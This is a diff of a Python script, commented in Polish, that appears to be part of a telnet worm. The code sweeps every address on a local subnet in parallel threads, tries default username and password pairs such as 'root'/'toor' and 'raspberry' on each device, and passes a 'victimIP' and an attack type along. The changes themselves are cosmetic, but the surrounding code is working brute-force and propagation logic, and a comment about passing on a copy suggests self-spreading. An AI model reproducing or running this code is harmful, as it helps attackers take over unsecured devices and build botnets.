@@ -1,7 +1,7 @@
 import socket
 import time
 import telnetlib
-
+#przekazac kopię
 # from requests import get       ->       można publiczny ip używać    w sumie nie wiem po co xD
 from _thread import start_new_thread
 
@@ -12,7 +12,7 @@ def telnetConnect(ip_address, victimIP, attackType: int):
     passwords = ['1234', 'toor', 'admin', 'root', 'user', 'raspberry']
 
     for user in users:
-        #print('connecting with login: ' + user)
+        # print('connecting with login: ' + user)
         for password in passwords:
 
             try:
@@ -20,10 +20,10 @@ def telnetConnect(ip_address, victimIP, attackType: int):
 
             except:
                 # if ip_addres does not respond return
-                #print("host not responding")
+                # print("host not responding")
                 return
 
-            #print(' and passwd: ' + password)
+            # print(' and passwd: ' + password)
             try:
                 tn.read_until(b"login: ")
                 tn.write(user.encode('ascii') + b"\n")
@@ -69,13 +69,12 @@ def checkForOtherDevices(ip, victimIP):
     while x < 254:
         current_address = ip + str(x)
         # próbuj połączyć z każdym przez telnet
-        #print(current_address)
-        start_new_thread(telnetConnect, (current_address, victimIP,1))
-        #telnetConnect(current_address, victimIP, attackType=1)# --> w wątku chyba???
+        # print(current_address)
+        start_new_thread(telnetConnect, (current_address, victimIP, 1))
+        # telnetConnect(current_address, victimIP, attackType=1)# --> w wątku chyba???
         x += 1
 
     print('finished')
-
 
 
 if __name__ == '__main__':
